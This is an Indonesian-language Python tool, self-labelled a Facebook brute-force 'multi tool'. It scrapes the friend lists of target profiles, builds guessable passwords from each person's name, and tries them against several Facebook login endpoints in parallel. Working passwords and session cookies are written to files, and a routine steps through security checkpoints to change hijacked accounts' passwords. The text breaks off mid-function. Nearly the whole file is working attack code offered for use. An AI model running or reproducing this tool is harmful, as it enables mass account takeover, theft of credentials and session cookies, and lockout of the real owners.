#script dibuat oleh Hendrian setyawan 
#KEYBORD WARRIOR


try:
	from time import time as mek
	import re
	import os
	import sys
	import bs4
	import json
	import time
	import random
	import datetime
	import requests
	ses = requests.Session()
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
except ImportError as e:
	exit(e)

try:
	import rich
	from rich.panel import Panel as nel
	from rich.panel import Panel
	from rich.text import Text
	from rich.tree import Tree
	from rich.table import Table
	from rich.tree import Tree
	from rich import print as cetak
	from rich.columns import Columns
	from rich.console import Console
	console = Console()
	from rich.panel import Panel as nel
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
except ImportError as e:
	exit(e)

tokenku,uasm,pwpluss,pwnya,uid,id,id2,akun,metode,loop,ok,cp = [],[],[],[],[],[],[],[],[],0,0,0

data,data2={},{}
aman,die,salah=0,0,0
ubahP,pwBaru=[],[]

url_mb = "https://mbasic.facebook.com"

dic = {'1':'1','2':'2','3':'3','4':'4','5':'5','6':'6','7':'7','8':'8','9':'9','10':'10','11':'11','12':'12'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tll = str(tgl)+'-'+str(bln)+'-'+str(thn)
H = '\x1b[1;92m'
K = '\033[93m' # KUNING +
G = '\033[m'
P = '\x1b[0;97m'
B = '\33[96m'
M = '\x1b[1;91m'
U = '\033[95m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
m = '\x1b[1;91m'
p = '\33[m'
b = '\x1b[1;94m'
def uayang():
	rr=random.randint
	rc=random.choice
	agent='Mozilla/5.0 (Linux; Android {str(rr(6,12))}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36'
	return agent
def back():
	os.system('clear');menu()
def load():
	with Progress(SpinnerColumn(),TextColumn("[progress.description]{task.description}"),transient=True) as progress:
		progress.add_task(description="[white]Mengecek data akun ...", total=None)
		time.sleep(1)
def banner3():
	cetak(nel(f'''[bold cyan]                                            
\t|_   _ \                                             
\t  | |_) | _ .--.  ,--.   ____   ____  .---.  _ .--.  
\t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\] 
\t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]
\nAuthor : HENDRIAN SETYAWAN'''))
def banner1():
	cetak(nel(f"""
	888888 88""Yb 8b    d8 888888 
	88__   88__dP 88b  d88   88   
	88""   88""Yb 88YbdP88   88   V1.2
	88     88oodP 88 YY 88   88   
         FACEBOOK BRUTE MULTI TOOLS""",width=90,padding=(0,8),title=f"Banner",style=f"bold cyan"))
def banner():
	os.system('clear')
	cetak(nel(f'''[bold cyan]
 __   ___   _______       ___      ___  _______    _______  
|/"| /  ") /"      \     |"  \    /"  ||   _  "\  /"     "| 
(: |/   / |:        |     \   \  //   |(. |_)  :)(: ______) 
|    __/  |_____/   )     /\\  \/.    ||:     \/  \/    |   
(// _  \   //      /     |: \.        |(|  _  \\  // ___)   
|: | \  \ |:  __   \     |.  \    /:  ||: |_)  :)(:  (      
(__|  \__)|__|  \___)    |___|\__/|___|(_______/  \__|     
AUTHOR :  HENDRIAN SETYAWAN [bold green](KEYBOARD WARRIOR)                                      ''',width=79,title=f'[bold white]BANNER',style='bold hot_pink2'))
def cekdata():
	load();time.sleep(4)
	
	try:
		open('c.txt','r').read()
		open('t.txt','r').read()
		os.system('clear')
		menu()
	except Exception as e:
		os.system('clear');login()
def KR_TEAM(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)

def login():
	print('')
	try:
		text = Text('https://business.facebook.com/business_locations',justify='center',style='b green')
		cetak(nel(text,title='apabila a2f on buka link di bawah, lalu masukan kode a2f'))
		cokis = input(f'[{h}*{p}] masukan cookie : ')
		cokie = {'cookie': cokis}
		data1 = {'access_token': '437340816620806|04a36c2558cde98e185d7f4f701e4d94', 'scope': ''}
		post1 = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data1).json()
		code1 = post1['code']
		code2 = post1['user_code']
		urlg1 = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=437340816620806|04a36c2558cde98e185d7f4f701e4d94'%(code1)
		urlg2 = sop(ses.get('https://mbasic.facebook.com/device',cookies=cokie).content, "html.parser")
		form1 = urlg2.find('form', {'method':'post'})
		data2 = {
			'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"',str(form1)).group(1),
			'fb_dtsg': re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form1)).group(1),
			'qr': '0',
			'user_code': code2
		}
		post2 = 'https://mbasic.facebook.com'+form1['action']
		post3 = sop(ses.post(post2,data=data2,cookies=cokie).content, 'html.parser')
		data2 = {}
		form2 = post3.find('form', {'method':'post'})
		for x in form2('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					data2.update({x['name']:x['value']})
			except Exception as e:
				pass
		post4 = 'https://mbasic.facebook.com'+form2['action']
		post5 = sop(ses.post(post4,data=data2,cookies=cokie).content,'html.parser')
		urlg3 = ses.get(urlg1,cookies=cokie).json()
		token = urlg3['access_token']
		text = Text(f'{token}',justify='center')
		cetak(nel(text))
		kot = open('t.txt','w').write(token)
		koc = open('c.txt','w').write(cokis)
		masuk = input(f'\n[{H}!{P}] tekan enter')
		os.system('clear')
		menu()
	except Exception as e:
		print(e)

def menu():
	banner()
	print(f'''[{h}1{p}] Daftar Teman Publik
[{h}2{p}] Daftar Teman Publik Massal
[{h}3{p}] Deteksi Checkpoint
[{h}4{p}] Deteksi Hasil Crack
[{h}5{p}] Dump Teman Publik
[{h}6{p}] Crack File
[{h}7{p}] Cek Opsi
[{h}8{p}] Info pemilik Script
[{m}0{p}] Keluar Hapus Cookie''')
	menu = input(f'\n[{h}!{p}] pilihan 0 sampai 6 : ')
	if menu in ['1']:
		publik()
	elif menu in ['2']:
		massal()
	elif menu in ['3']:
		check()
	elif menu in ['4']:
		hasil()
	elif menu in ['5']:
		dumpp()
	elif menu in ['6']:
		cfile()
	elif menu in ['7']:
		warning()
	elif menu in ['8']:
		author()
	elif menu in ['0']:
		keluar()
	else:
		exit('\nMasukan Pilihan Yang Benar')
def warning():
	cetak(nel('masih dalam perbaikan'))
def author():
	cetak(nel(f'[bold green]Script ini dibuat oleh salah satu anggota Keyboard Warior : [bold cyan]Hendrian Setyawan\n[bold green]Di Support oleh all anggota KR TEAM: \n[bold white]Muhammad Agam Nugraha Pranata\nMuhammad Nizam Azmi\nBayu Putra Pratama\nAbdul Rohman Sholeh\n[bold red]Hargai Author pembuat Script ini dengan tanpa mengubah nama info diatas'));time.sleep(10);os.system('clear');menu()
      
def dumpp():
	try:
		naman = []
		print('\ncontoh : dump.txt')
		namaf = input(f'\n[{h}!{p}] masukan nama file  : ')
		namak = input(f'[{h}!{p}] masukan target     : ')
		simpn = ("/sdcard/dump/"+namaf)
		mahok = open(simpn,"w")
		naman.append(namaf)
	except FileNotFoundError:
		exit()
	try:
		tok = open('t.txt','r').read()
		cok = open('c.txt','r').read()
		nam = ses.get(f'https://graph.facebook.com/{namak}?fields=friends.limit(5000)&access_token={tok}',cookies = {'cookies':cok}).json()
		for bay in nam['friends']['data']:
			try:
				id.append(bay['id']+"|"+bay['name'])
				mahok.write(bay['id']+"|"+bay['name']+"\n")
				print('\rberhasil mengumpulkan  : %s'%(len(id)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
	except (KeyError,IOError):
		print('\nakun tidak publik !')
		os.system('clear')
		menu()

def cfile():
	print('')
	try:vin = os.listdir('/sdcard/dump')
	except FileNotFoundError:
		print('\nfile tidak di temukan')
		time.sleep(2);os.system('clear')
		menu()
	if len(vin)==0:
		print('')
		print('file dump tidak di temukan')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/dump/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'[{h}%s{p}] %s %s{p}'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(f'[{h}%s{p}] %s %s{p}'%(cih,isi,len(hem)))
		geeh = input(f'\n[{h}!{p}] pilihan 1 sampai {cih} : ')
		print('')
		try:geh = lol[geeh]
		except KeyError:
			print(f'\nmasukan yang benar !')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/dump/'+geh,'r').read().splitlines()
		except:
			print('file tidak di temukan gunakan fitur nomer 5 terlebih dahulu')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		dump()

def publik():
	tok = open('t.txt','r').read()
	cok = open('c.txt','r').read()
	kun = input(f'\n[{h}!{p}] masukan target     : ')
	try:
		gam = ses.get(f'https://graph.facebook.com/{kun}?fields=friends.limit(5000)&access_token={tok}',cookies = {'cookies':cok}).json()
		for dap in gam['friends']['data']:
			try:
				id.append(dap['id']+"|"+dap['name'])
			except:continue
		dump()
	except (KeyError,IOError):
		print('\nakun tidak publik ! ')
		time.sleep(1)
		os.system('clear')
		menu()

def massal():
	try:
		token = open('t.txt','r').read()
		cok = open('c.txt','r').read()
		tokenku.append(token)
	except IOError:
		exit()
	try:
		jum = int(input(f'\n[{h}!{p}] masukan jumlah     : '))
	except ValueError:
		exit('\nMasukan Nomer Yang Benar, Contoh : 1,2,3 !')
	if jum<1 or jum>100:
		exit('\nMaksimal 100 Target !')
	no = 0
	for met in range(jum):
		no+=1
		kl = input(f'[{h}{str(no)}{p}] masukan target     : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			exit('\nKesalahan Koneksi Jaringan')
	try:
		dump()
	except requests.exceptions.ConnectionError:
		exit('\nKesalahan Koneksi Jaringan')
	except (KeyError,IOError):
		exit('\nAkun Tidak Publik !')

def dump():
	print(f'{p}berhasil mengumpulkan  : %s'%(len(id)))
	for baru in id:
		id2.insert(0,baru)
	methode()

def methode():
	cetak(nel(f'[bold cyan]1.login reguler\n2.login uid\n3.login uid\n4.graph facebook'))
	logg = input(f'\n[{h}!{p}] pilihan 1 sampai 4 : ')
	if logg in ['1']:
		metode.append('regular')
	elif logg in ['2']:
		metode.append('validate')
	elif logg in ['3']:
		metode.append('validate2')
	elif logg in ['4']:
		metode.append('graph')
	else:
		exit()
	print(f'\n{p}[{h}1{p}] Password manual {h}[sangat disarankan]')
	print(f'[{h}2{p}] Password otomatis{m}[tidak disarankan]')
	meto = input(f'\n[{h}!{p}] pilihan 1 sampai 2 : ')
	if meto in ['1']:
		manual()
	elif meto in ['2']:
		password()
	else:
		exit()

def manual():
	pwpluss.append('manual')
	cetak(nel(f'''[bold cyan]
gunakan password minimal 6 karakter
contohnya : Jakarta, Bekasi, Bandung'''))
	pwku = input('\nmasukan password    : ')
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		pwnya.append(xpw)
		password()
	else:
		exit()
		
def useragent():
	sambro = str(random.randint(1,100))+'.'+str(random.randint(0,9))
	android_version = str(random.randint(1,12))
	device_model = random.choice(['RMO-NX1','SHARK PAR-H0','SAMSUNG SM-G736U1','SAMSUNG SM-G736U1','Infinix X655F','Nokia 8 V 5G UW','T790Y','T810S','RMX2202','CPH1983','SAMSUNG SM-G935L Build/NRD90M','SAMSUNG SM-E5260','SAMSUNG SM-A826S','Lenovo L19041','CPH2401','SAMSUNG SM-M336K/KSU3AVI3','BV8800','SAMSUNG SM-M017F','Z6252CA','SC-51B','V2044','SAMSUNG SM-J700P','KAZ-N20','BV9800','BV6600E','Mi 10T','Mi 9T','Mi 10T Pro'])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{sambro} Chrome/{chrome_version} Mobile Safari/537.36'
	return ua

def password():
	global prog,des
	print(f'''{p}
[{h}!{p}] hasil akun OK tersimpan di : {okc}
[{h}!{p}] hasil akun CP tersimpan di : {cpc}''')
	print('')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=10) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				full = nmf.replace(" ", "")
				pwv = []
				if len(nmf)<10:
					if len(frs)<10:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs)
						pwv.append(full+'123')
						pwv.append(full+'12345')
						pwv.append(full+'1122')
						pwv.append(full+'786')
						pwv.append(frs+'123')
						pwv.append(frs+'1122')
						pwv.append(frs+'786')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(full+'123')
						pwv.append(full+'12345')
						pwv.append(full+'1122')
						pwv.append(full+'786')
						pwv.append(frs+'786')
						pwv.append(frs+'1122')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'manual' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'regular' in metode:
					pool.submit(reg,idf,pwv)
				elif 'validate' in metode:
					pool.submit(val,idf,pwv)
				elif 'validate2' in metode:
					pool.submit(val2,idf,pwv)
				elif 'graph' in metode:
					pool.submit(graph,idf,pwv)
				else:
					pool.submit(reg,idf,pwv)
	print('\nCrak Selesai !\n');print(f'Hasil OK : %s '%(ok));print(f'Hasil CP : %s '%(cp));print(f'\nhasil ok tersimpan di OK/{okc}');print(f'hasil cp tersimpan di CP/{cpc}')

def reg(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"{loop}/{len(id)} [b green]{ok}[/]/[b yellow]{cp}[/]")
	prog.advance(des)
	ua=useragent()
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get(f"https://m.facebook.com/login/?refsrc=deprecated&ref=dbl&_rdr")
			headers = {
				"Host": "m.facebook.com",
                    "content-length": f"{str(len(data))}",
                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "user-agent":ua,
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "origin": "https://m.facebook.com",
                    "x-requested-with": "com.facebook.katana",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.facebook.com/login/?refsrc=deprecated&ref=dbl&_rdr",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": idf,
                    "prefill_contact_point": f"{user} {pw}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pw}",
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)


			}
			post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=headers)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print(f'[{h}✓{p}] Email : {h}{idf}{p}')
				print(f'[{h}✓{p}] Sandi : {h}{pw}{p}')
				
				print('\r')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print(f'[{k}X{p}] Email : {k}{idf}{p}')
				print(f'[{k}X{p}] Sandi : {k}{pw}{p}')
			
				print('\r')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
1

def val(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	prog.update(des,description=f'{loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]')
	prog.advance(des)
	ua=useragent()
	ses = requests.Session()
	for pw in pwv:
		try:
			headers = {
				'Host': 'm.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://m.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent':ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&wtsid=rdr_0c8CjWOpjVxFaAj61&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			urls = sop(ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr').text, "html.parser")
			form = urls.find('form', {'method':'post'})
			data = {
				'lsd': re.search('name="lsd" type="hidden" value="(.*?)"',str(form)).group(1),
				'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
				'uid': idf,
				'next': 'https://m.facebook.com/login/save-device/',
				'flow': 'login_no_pin',
				'pass': pw,}
			post = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=headers)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print(f'[{h}✓{p}] Email : {h}{idf}{p}')
				print(f'[{h}✓{p}] Sandi : {h}{pw}{p}')
				
				print('\r')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print(f'[{k}X{p}] Email : {k}{idf}{p}')
				print(f'[{k}X{p}] Sandi : {k}{pw}{p}')
			
				print('\r')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
1

def val2(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	prog.update(des,description=f'{loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]')
	prog.advance(des)
	ua=useragent()
	ses = requests.Session()
	for pw in pwv:
		try:
			headers = {
				"Host": "m.facebook.com",
				"cache-control": "max-age=0",
				"sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
				"sec-ch-ua-mobile": "?1",
				"upgrade-insecure-requests": "1",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": "Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9"
			}
			response = sop(
				ses.get(
					'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',headers=headers
				).text, "html.parser"
			)
			data = {
				x.get("name"):x.get("value") for x in response.findAll("input",
				{"type":"hidden", "value":True})
			}
			data.update(
				{
					"uid":idf,
					"pass":pw
				}
			)
			headers.update(
				{
					"referer": "https://m.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin&refsrc=deprecated&_rdr",
				}
			)
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=data, headers=headers)

			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print(f'[{h}✓{p}] Email : {h}{idf}{p}')
				print(f'[{h}✓{p}] Sandi : {h}{pw}{p}')
				
				print('\r')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print(f'[{k}X{p}] Email : {k}{idf}{p}')
				print(f'[{k}X{p}] Sandi : {k}{pw}{p}')
			
				print('\r')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
1
def graph(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	prog.update(des,description=f'{loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]')
	prog.advance(des)
	for pw in pwv:
		try:
			headers = {
				'Host': 'b-graph.facebook.com',
				'content-encoding': 'gzip',
				'authorization': 'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
				'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
				'content-type': 'application/x-www-form-urlencoded',
				'accept-encoding': 'gzip'
			}
			data = {
				'email': idf,
				'password': pw,
				'credentials_type': 'password',
				'error_detail_type': 'button_with_disabled',
				'format': 'json',
				'device_id': '6302b9f7-76a5-423c-9a3e-346479b262cd',
				'generate_session_cookies': '1',
				'generate_analytics_claim': '1',
				'generate_machine_id': '1',
				'method': 'POST'
			}
			post = ses.post('https://b-graph.facebook.com/auth/login',params=data,headers=headers)
			if "access_token" in post.text:
				ok+=1
				tokn = "".join(post.json()["access_token"])
				tree = Tree('')
				tree.add(f'[bright_green]{idf}|{pw}[/]').add(f'[bright_green]{tokn}[/]')
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			elif "User must verify their account" in post.text:
				cp+=1
				tree = Tree('')
				tree.add(f'[bright_yellow]{idf}|{pw}[/]')
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			elif "Calls to this api have exceeded the rate limit." in post.text:
				prog.update(des,description=f'[b red]Spam[/] {loop}/{len(id)} OK:-{ok} CP:-{cp}')
				prog.advance(des)
				time.sleep(30)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def cek_opsi(user,pasw):
	global aman,die,salah
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	})
	soup=sop(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pasw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=sop(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print(f"\rAkun Sesi New",end="")
		else:
			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
			print(f"\rAkun Tidak Terkunci");time.sleep(0.03)
	elif "checkpoint" in session.cookies.get_dict():
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url_mb+link2.get("action"),data=data2)
		response2=sop(an.text,"html.parser")
		number=0
		cek=[cek.text for cek in response2.find_all("option")]
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "y" in ubahP:
					yotta = pwBaru
					ubah_pw(session,response,link2,user,yotta)
				else:
					print("\rAkun Tap Yes")
					ubah_pw(session,response,link2,user,yotta)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\rAkun Memiliki Verifikasi A2F")
			else:
				print("Kesalahan!")
		else:
			print(f"Terdapat {m}%s{p} Opsi"%(len(cek)))
		for opt in range(len(cek)):
			print(f"[{m}{str(opt+1)}{p}] "+cek[opt])
	else:
		print("\rPassword Salah Dan Sudah Di Ganti")

def ubah_pw(session,response,link2,user,yotta):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
	resUbah=sop(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(yotta)})
		an=session.post(url_mb+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print(f"\r[√] Akun tap yes\n[=] Password diubah!\n{user} | {''.join(yotta)}\n[=] Cookie: {coki}							",end="")
		print("")

def check():
	ww = input(f"\n[{h}!{p}] Ubah Password Ketika Tap Yes [y/t] : ")
	if ww in ("y","ya"):
		ubahP.append("y")
		print("")
		pwBar=input("Masukan Password Baru : ")
		print("")
		if len(pwBar) <= 5:
			exit("Password harus lebih dari 6 character!")
		else:
			pwBaru.append(pwBar)
	else:
		print("> Skipped")
	dirs = os.listdir('CP')
	for file in dirs:
		print("%s"%(file))
	print("")
	files = input("Masukan Nama File : ")
	try:
		buka = open(f'CP/{files}','r').readlines()
	except FileNotFoundError:
		exit("File Tidak Ditemukan")
	print("")
	print(f'Total Akun        : {k}%s{p} Akun'%(str(len(buka))))
	for ian in buka:
		dapa = ian.replace('\n', '')
		agam = dapa.split('|')
		print('')
		print(f'Akun : {k}{dapa.replace("die", "")}{p}')
		try:
			cek_opsi(agam[0].replace("die ", ""), agam[1])
		except req.exceptions.ConnectionError:
			continue
			print("")

def hasil():
	files = []
	print(f'\n[{h}1{p}] Liat Hasil Akun OK')
	print(f'[{h}2{p}] Liat Hasil Akun CP')
	res = input(f"\n[{h}!{p}] pilihan 1 sampai 2 : ")
	if res in["1","01"]:
		dirs = os.listdir("OK")
		print(f'\n[{h}!{p}] Sudah Ditemukan {len(dirs)} File Hasil OK')
		print('')
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			totalok = open(f"OK/{file}","r").read().splitlines()
			print(f'[{h}{num}{p}] {file} {len(totalok)} Akun ')
		bngst = input(f"\n[{h}!{p}] pilihan 1 sampai {num} : ")
		try:
			kontol = files[int(bngst)-1]
			totalok = open("OK/%s"%(kontol)).read().splitlines()
		except IOError:
